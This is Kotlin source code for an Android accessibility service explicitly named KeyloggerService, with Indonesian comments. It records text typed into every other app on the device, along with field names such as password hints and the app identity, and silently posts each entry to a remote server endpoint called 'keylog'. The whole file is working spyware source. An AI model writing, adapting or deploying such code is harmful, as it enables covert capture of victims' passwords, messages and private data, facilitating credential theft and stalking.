package com.kztutorial99.androidconnector

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class KeyloggerService : AccessibilityService() {

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    // Debounce: hanya kirim jika teks berbeda dari sebelumnya
    private var lastText = ""
    private var lastPackage = ""
    private var lastField = ""

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_FOCUSED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val event = event ?: return

        // Hanya tangkap event perubahan teks
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return

        val packageName = event.packageName?.toString() ?: return
        // Abaikan app kita sendiri
        if (packageName == this.packageName) return

        val text = event.text.joinToString("").trim()
        if (text.isBlank()) return

        // Field name dari hint atau className
        val fieldHint = event.source?.let { node ->
            val hint = node.hintText?.toString() ?: ""
            val desc = node.contentDescription?.toString() ?: ""
            val viewId = node.viewIdResourceName?.substringAfterLast("/") ?: ""
            when {
                hint.isNotBlank() -> hint
                desc.isNotBlank() -> desc
                viewId.isNotBlank() -> viewId
                else -> event.className?.toString()?.substringAfterLast(".") ?: "EditText"
            }
        } ?: "EditText"

        // Debounce — jangan kirim kalau sama persis
        if (text == lastText && packageName == lastPackage && fieldHint == lastField) return
        lastText = text
        lastPackage = packageName
        lastField = fieldHint

        val prefs = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", null) ?: return

        // Kirim ke server di background thread
        val body = JsonObject().apply {
            addProperty("deviceId",     deviceId)
            addProperty("appPackage",   packageName)
            addProperty("appName",      getAppName(packageName))
            addProperty("fieldName",    fieldHint)
            addProperty("text",         text)
        }

        Thread {
            try {
                http.newCall(
                    Request.Builder()
                        .url("${SecureConfig.serverUrl()}/api/device/keylog")
                        .post(body.toString().toRequestBody(JSON_MEDIA))
                        .build()
                ).execute().close()
            } catch (_: Exception) {}
        }.also { it.isDaemon = true }.start()
    }

    override fun onInterrupt() {}

    private fun getAppName(pkg: String): String {
        return try {
            val pm = packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
        } catch (_: Exception) { pkg }
    }
}
